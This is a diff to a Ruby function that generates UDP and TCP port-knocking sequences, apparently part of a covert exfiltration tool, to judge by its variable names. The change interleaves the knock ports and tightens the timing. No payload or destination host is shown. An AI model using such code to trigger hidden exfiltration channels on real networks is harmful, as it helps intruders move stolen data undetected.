@@ -233,17 +233,12 @@ def generate_knock_seq
   if $cfg_exfil_protocol == UDP
     begin
       3.times {
-        udp_packet(iface_config, 44444, covert_config)
-        sleep 1
-      }
-      sleep 2
-      3.times {
-        udp_packet(iface_config, 55555, covert_config)
-        sleep 1
-      }
-      sleep 2
-      3.times {
-        udp_packet(iface_config, 44544, covert_config)
+        3.times {
+          udp_packet(iface_config, 44444, covert_config)
+          udp_packet(iface_config, 55555, covert_config)
+          udp_packet(iface_config, 44544, covert_config)
+          sleep 0.3
+        }
         sleep 1
       }
       sleep 5
@@ -254,17 +249,12 @@ def generate_knock_seq
   elsif $cfg_exfil_protocol == TCP
     begin
       3.times {
-        tcp_packet(iface_config, 33333, covert_config)
-        sleep 1
-      }
-      sleep 2
-      3.times {
-        tcp_packet(iface_config, 22222, covert_config)
-        sleep 1
-      }
-      sleep 2
-      3.times {
-        tcp_packet(iface_config, 33233, covert_config)
+        3.times {
+          tcp_packet(iface_config, 33333, covert_config)
+          tcp_packet(iface_config, 22222, covert_config)
+          tcp_packet(iface_config, 33233, covert_config)
+          sleep 0.3
+        }
         sleep 1
       }
       sleep 5
